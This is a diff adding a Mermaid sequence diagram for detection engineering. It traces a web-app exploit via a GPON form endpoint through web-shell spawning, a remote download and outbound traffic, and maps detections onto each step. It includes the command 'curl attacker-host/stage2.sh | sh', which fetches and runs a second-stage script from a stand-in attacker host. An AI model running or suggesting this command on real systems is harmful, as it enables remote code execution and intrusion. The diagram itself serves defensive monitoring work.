@@ -1,0 +1,17 @@
+sequenceDiagram
+    participant Attacker
+    participant WebApp as Vulnerable web app
+    participant Worker as Web-server worker process
+    participant Shell as /bin/sh (web shell)
+    participant DL as curl (LOLBin download)
+    participant C2 as Attacker-controlled host
+
+    Attacker->>WebApp: POST /GponForm/diag_Form (exploit-shaped request, DET-16-01)
+    WebApp->>Worker: Vulnerable handler processes request, RCE triggers
+    Worker->>Shell: Worker spawns shell (DET-16-04 lineage signal)
+    Note over Worker,Shell: Stage 3 join: request timestamp -> process-create timestamp,\nbounded window + host match (Detection Autopsy, Section 4)
+    Attacker->>Shell: Second request, distinct command (non-interactive pivot, Section 5)
+    Shell->>DL: curl attacker-host/stage2.sh | sh
+    Note over Shell,DL: DET-47-01: web-server-lineage shell -> LOLBin download,\nsame host, bounded window
+    DL->>C2: Outbound connection, new/rare destination for this host role
+    Note over DL,C2: DET-47-02: web-tier egress-baseline deviation\nfollowing Suspicious-or-higher lineage event
